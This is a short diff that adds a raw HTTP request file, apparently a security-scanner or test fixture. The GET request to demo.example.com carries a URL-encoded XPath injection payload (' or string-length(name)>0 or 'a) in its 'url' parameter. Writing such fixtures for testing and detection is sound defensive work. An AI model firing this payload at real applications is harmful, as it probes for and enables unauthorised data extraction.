@@ -1,0 +1,4 @@
+GET /a?url=%27%2Bor%2Bstring-length%28name%29%3E0%2Bor%2B%27a HTTP/1.1
+Host: demo.example.com
+Connection: close
+
